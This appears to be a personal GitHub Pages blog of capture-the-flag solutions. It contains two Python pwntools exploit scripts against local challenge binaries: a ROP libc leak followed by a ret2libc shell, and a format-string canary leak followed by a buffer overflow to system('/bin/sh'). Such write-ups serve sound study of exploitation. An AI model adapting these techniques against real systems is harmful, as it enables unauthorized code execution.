## Welcome to Fuzzer's Palace

You can use the [editor on GitHub](https://github.com/Fuzz3rCTF/Fuzz3rCTF.github.io/edit/master/index.md) to maintain and preview the content for your website in Markdown files.

Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.

### Greek ECSC QUALS 2017-Pwn Challenge
```python
from pwn import *
from struct import pack, unpack


def pwn():
    p = lambda x : pack("I",x)
    r = process('./bombsaway')
    print r.recv()
    r.sendline('test')
    print r.recv()
    r.sendline('2')
    print r.recv()
    payload = 'A'*556
    payload += p32(0x080483b0) # plt of write
    payload += p32(0x08048400) # ret
    payload += p32(0x1)
    payload += p32(0x080f700c) # read in got
    payload += p32(0x4) #leak

    r.sendline(payload)
    rec = r.recvuntil('Password:')
    print rec
    i = 40
    rec = rec[i:i+4]
    read_libc = unpack('I', rec)[0]
    print '[+] Libc addr of read: '+hex(read_libc)
    libc_base = read_libc-0x0e5620
    print '[+] Libc base: '+hex(libc_base)
    sys = p(libc_base+0x03cd10)
    lol = p(libc_base+0x123456)
    binsh = p(libc_base+0x17b8cf)
    r.sendline('test')
    r.recvuntil('Option:')
    r.sendline('2')
    r.recvuntil(':')
    fpayload = 'A'*544
    fpayload += sys
    fpayload += lol
    fpayload += binsh
    r.sendline(fpayload)
    r.interactive()

pwn()
```

### HOW2BOF-Bof6 Challenge
```python
from pwn import *

def pwn():
        sys_off = 0x03ada0
        exit_off = 0x02e9d0
        bin_sh_off = 0x15ba0b
        p = lambda x : (x[2:].decode('hex'))[::-1]
        r = process('./bof6')
        r.recvuntil('Name: ')
        r.sendline('%x '*18)
        a = r.recvuntil(':')
        print a
        canary = hex(int(a[57:65], 16))
        libc=int(a[95:103],16)-1777664
        print "[+] Here is your cookie motherfucker: "+str(canary)
        print "[+] Libc base address SKIDO: "+hex(libc)
        payload = ""
        payload += "A"*64
        payload += p(canary)
        payload += "B"*12
        payload += p(hex(libc+sys_off))
        payload += p(hex(libc+exit_off))
        payload += p(hex(libc+bin_sh_off))
        r.sendline(payload)
        r.interactive()

pwn()
```

For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).

### ~$ WHOAMI
1. I am a Greek high school student. 
2. I love Binary Reverse Engineering and Exploitation!


### Support or Contact

[Twitter](https://www.twitter.com/proud_skid/) 
